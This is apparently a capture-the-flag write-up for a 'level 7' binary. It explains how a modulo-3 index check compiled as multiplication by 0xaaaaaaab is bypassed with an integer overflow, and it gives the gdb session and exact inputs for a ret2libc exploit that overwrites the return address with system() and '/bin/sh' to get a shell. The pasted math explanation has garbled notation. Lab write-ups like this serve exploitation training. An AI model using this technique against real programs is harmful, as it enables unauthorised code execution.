<h1 align="center"> LEVEL 7 </h1>

## 🔍 Analysis of Decompiled [level7](./pseudo.py)

we found the first element store in the index 1 * 4 so the first element store in 0xFFFFD544 we calculate the offset between the return address and the value we store we found it is 456 that's mean that we must overwrite the return address in the index 114.

when we try use this number we got
```
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

when we check the assembly we found this :
```
   0x08048671 <+65>:    mov    edx,0xaaaaaaab // a Magic number
   0x08048676 <+70>:    mov    eax,ecx
   0x08048678 <+72>:    mul    edx
   0x0804867a <+74>:    shr    edx,1
   0x0804867c <+76>:    mov    eax,edx
   0x0804867e <+78>:    add    eax,eax
   0x08048680 <+80>:    add    eax,edx
   0x08048682 <+82>:    mov    edx,ecx
   0x08048684 <+84>:    sub    edx,eax
   0x08048686 <+86>:    test   edx,edx
```
in those steps they checked if our number is divided by 3 or not index % 3 === 0

but why we have a division and its represnt it as a multiplication by 0xaaaaaab ??

The answer to the question right above this line
It's provable, and hopefully we can get some intuition about the whole thing. In the following proof, division is exact, not that integer-truncating stuff that C does; to round down I'll use floor. Also, this only covers unsigned division: every number that appears is non-negative. (Signed division is broadly similar, though does differ in some details.) Lastly, we're going to assume that the denominator d is not a power of 2, which is weirdly important. If d were a power of 2, we'd skip the multiplication and just use shifts, so we haven't lost any generality.

We have some fixed positive denominator d and some variable nonegative numerator n, and we want to compute the quotient nd

- no, wait, ⌊nd⌋
  , since that's what C does. We'll multiply the top and bottom by 2k, where k is some positive integer power - it represents the precision in a sense, and we'll pick its value later:

⌊nd⌋=⌊nd×2k2k⌋=⌊2kd×n2k⌋

We're going to call that 2kd
term mexact, because it's our "magic number" that lets us compute division through multiplication. So we have:
mexact=2kd

⌊nd⌋=⌊mexact×n2k⌋

This equality looks promising, because we've hammered our expression into the shape we want; but we haven't really done anything yet. The problem is that mexact is a fraction, which is hard for computers to multiply. (We know it's a fraction because d is not a power of 2). The tricky part is finding an integer approximation of mexact that gives us the same result for any dividend up to the largest possible one (UINT_MAX in our case). Call this approximation m. So we have m≈mexact
, where m is an integer.

.
.
.
Every divisor has a magic number, and most have more than one! A magic number for d is nothing more than a precomputed quotient: a power of 2 divided by d and then rounded up. At runtime, we do the same thing, except backwards: multiply by this magic number and then divide by the power of 2, rounding down. The tricky part is finding a power big enough that the "rounding up" part doesn't hurt anything. If we are lucky, a multiple of d will happen to be only slightly larger than a power of 2, so rounding up doesn't change much and our magic number will fit in 32 bits. If we are unlucky, well, we can always fall back to a 33 bit number, which is almost as efficient.

we use the same way that we use in the rainfall project so we know they shift left by 2 << 2
```
    10 00 00 00 00 00 00 00 00 00 00 00 01 11 00 10 << 2

    10 00 00 00 00 00 00 00 00 00 00 00 01 11 00 10   <---- 2147483762
     ^                                              ^
     |                                              |
we remove this                              we add 00 here

result is  : 00 00 00 00 00 00 00 00 00 00 00 01 11 00 10 00  = 456
```

##  Final Exploit
we gona fill this field by the system address and we keep the next and we change the address 116 to address '/bin/sh' (return to libc)


```BASH
(gdb) p &system
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)

Input command: store
 Number: 4159090384 <--- 0xF7E6AED0 <system>
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172 <-- 0xF7F897EC "/bin/sh"
 Index: 116
 Completed store command successfully
Input command: quit
$
```